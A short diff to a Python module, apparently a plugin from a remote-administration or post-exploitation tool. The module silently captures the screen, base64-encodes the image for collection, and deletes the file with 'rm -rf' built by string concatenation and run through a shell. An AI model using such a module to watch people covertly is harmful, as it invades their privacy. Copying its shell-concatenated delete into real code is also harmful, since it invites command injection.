@@ -5,7 +5,6 @@ __license__ = "GPLv3"
 import subprocess
 import mss
 from base64 import b64encode
-import random
 
 def run_command(command):
     out, err = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
@@ -13,7 +12,7 @@ def run_command(command):
 
 
 def run(options):
-    OUTPUT_FILE = f"screenshot{random.randint(0,100)}.jpg"
+    OUTPUT_FILE = "screenshot.jpg"
     with mss.mss() as sct:
         sct.shot(output=OUTPUT_FILE)
     with open(OUTPUT_FILE,'rb') as f:
@@ -22,4 +21,4 @@ def run(options):
     raw_data = b64encode(data)
 
     print(raw_data)
-    # run_command("rm -rf " + OUTPUT_FILE)
+    run_command("rm -rf " + OUTPUT_FILE)
